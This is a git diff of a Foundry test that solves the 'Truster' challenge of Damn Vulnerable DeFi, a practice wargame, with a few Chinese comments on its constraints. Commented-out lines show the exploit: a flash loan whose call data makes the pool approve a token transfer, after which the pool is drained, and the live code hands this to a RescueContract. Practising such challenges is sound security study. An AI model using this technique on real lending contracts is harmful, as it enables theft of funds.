@@ -5,6 +5,8 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+// adding
+import {RescueContract} from "./RescueContract.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -17,6 +19,7 @@ contract TrusterChallenge is Test {
     TrusterLenderPool public pool;
 
     modifier checkSolvedByPlayer() {
+        // 只能有
         vm.startPrank(player, player);
         _;
         vm.stopPrank();
@@ -51,7 +54,19 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // 不能更改 prank
+        // bytes memory data = abi.encodeCall(token.approve, (recovery, TOKENS_IN_POOL));
+        // pool.flashLoan(0, player, address(token), data);
+
+        // vm.prank(recovery);
+        // token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+
+        // console.log("pool balance: ", token.balanceOf(address(pool)));
+        // console.log("recovery balance: ", token.balanceOf(address(recovery)));
+
+        RescueContract rescueContract = new RescueContract(address(token), address(pool));
+        rescueContract.rescue(recovery, TOKENS_IN_POOL);
+
     }
 
     /**
@@ -59,6 +74,7 @@ contract TrusterChallenge is Test {
      */
     function _isSolved() private view {
         // Player must have executed a single transaction
+        // 执行一笔交易
         assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
 
         // All rescued funds sent to recovery account
